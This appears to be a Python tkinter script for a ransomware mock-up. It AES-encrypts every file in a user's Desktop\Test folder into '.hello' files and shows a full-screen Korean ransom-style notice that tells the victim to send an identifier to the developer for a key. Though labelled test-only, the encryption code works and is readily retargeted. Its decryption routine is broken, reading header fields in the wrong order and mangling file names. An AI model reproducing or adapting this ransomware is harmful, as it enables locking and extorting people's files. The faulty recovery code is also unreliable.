import os
import random
import tkinter as tk
import hashlib
import hmac
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import unpad, pad

device = os.urandom(64).hex()
username = os.getenv('username')
key = "HelloThisIsTestDoNotAbuseIt"
encrypt_key = hmac.new(key.encode('utf-8'), device.encode('utf-8'), hashlib.sha256).digest()

msg = """
Q. 내 파일은 어떻게 되었나요?
A. 당신의 PC에 있는 파일은 모두 암호화가 되어 더 이상 접근을 하지 못하는 상태가 되었습니다.
   하지만 걱정하지 않으셔도 됩니다. 당신의 파일은 안전하게 보존되어 있습니다.

Q. 암호화된 내 파일들을 복구할 수 있나요?
A. 네 당연합니다. 이 프로그램은 오로직 테스트용이기에 개발자를 찾아 연락을 하셔야 합니다.
   개발자에게 당신의 식별키를 전송하면 개발자는 복호화를 할 수 있는 key를 당신에게 전송합니다.

<주의사항>

# 당신의 파일을 안전하게 보존하기 위해 시스템의 작업을 중단하였습니다.
# 완벽한 파일 복구를 위하여 암호화된 파일을 수정하려 하지 마십시오. 영원히 복구가 되지 않습니다.
# 당신의 식별키는 1회용으로 구성이 되어 있기에 소프트웨어를 닫거나 삭제할 시 파일은 복구가 되지 않습니다.
# 당신의 소중한 파일 보호를 위해 아무것도 하지 않는 걸 권합니다.
"""

class app(tk.Tk):
    def __init__(self):
        super().__init__()

        global device
        global username
        global msg

        self.title("Do Not close")
        self.geometry("1280x720")
        self.resizable(False, False)
        self.configure(bg='black')

        self.title_label = tk.Label(self, text="당신의 파일들은 암호화가 되었습니다.", font = ("Helvetica", 32), fg="#EB0000", bg='black')
        self.title_label.place(relx=0.5, rely=0.15, anchor="center")

        self.massage_label = tk.Label(self, text=f"당신의 PC (디바이스 이름 : {username}) 에 저장된 모든 파일은 암호화가 되어 더 이상 접근을 할 수 없게 되었습니다. \nㅠㅠ 어떡행", font =("Helvetica", 15), bg='black', fg='#3296D7')
        self.massage_label.place(relx=0.5, rely=0.25, anchor="center")

        self.info_label = tk.Label(self, text=msg, font =("Helvetica", 12), justify="left", bg='black', fg='#3296D7')
        self.info_label.place(relx=0.5, rely=0.55, anchor="center")

        self.device_label = tk.Label(self, text=f"장치 시리얼 : {device}", font =("Helvetica", 12), fg="#B9062F", bg='black')
        self.device_label.place(relx=0.5, rely=0.8, anchor="center")

        # 복호화 버튼 추가
        self.decrypt_button = tk.Button(self, text="복호화 파일 실행", command=self.decrypt_files)
        self.decrypt_button.place(relx=0.5, rely=0.95, anchor="center")
        for root, dirs, files in os.walk(f"C:\\Users\\{username}\\Desktop\\Test"):  # 경로 이 부분 절대 건드리지 말 것.
            for filename in files:
                file_path = os.path.join(root, filename)
                self.encrypt(file_path)

    def encrypt(self, filename):
        global encrypt_key

        output_filename = filename + ".hello"
        file_size = str(os.path.getsize(filename)).zfill(16).encode('utf-8')
        chunk_size = 64 * 1024

        IV = get_random_bytes(16)

        encryptor = AES.new(encrypt_key, AES.MODE_CBC, IV)

        with open(filename, 'rb') as input_file:
            with open(output_filename, 'wb') as output_file:
                output_file.write(file_size) # 파일 크기를 기록
                output_file.write(IV)  # IV를 파일의 앞부분에 기록

                while True:
                    chunk = input_file.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)

                    output_file.write(encryptor.encrypt(chunk))

        print(f"암호화 완료: {output_filename}, 원본 크기: {file_size}")

    def decrypt_files(self):
        for root, dirs, files in os.walk(f"C:\\Users\\{username}\\Desktop\\Test"):  # 경로 이 부분 절대 건드리지 말 것.
            for filename in files:
                if filename.endswith(".hello"):
                    file_path = os.path.join(root, filename)
                    self.decrypt(file_path)

    def decrypt(self, filename):
        global encrypt_key

        with open(filename, 'rb') as input_file:
            IV = input_file.read(16)  # 첫 16바이트는 IV
            decryptor = AES.new(encrypt_key, AES.MODE_CBC, IV)

            # 출력 파일명
            output_filename = filename + filename.replace(".hello", "")

            with open(output_filename, 'wb') as output_file:
                filesize = input_file.read(16)
                IV = input_file.read(16)
                decryptor = AES.new(encrypt_key, AES.MODE_CBC, IV)
                while  True:
                    chunk = input_file.read(64 * 1024)
                    if len(chunk) == 0:
                        break
                    output_file.write(decryptor.decrypt(chunk))


if __name__ == "__main__":
    myapp = app()
    myapp.mainloop()


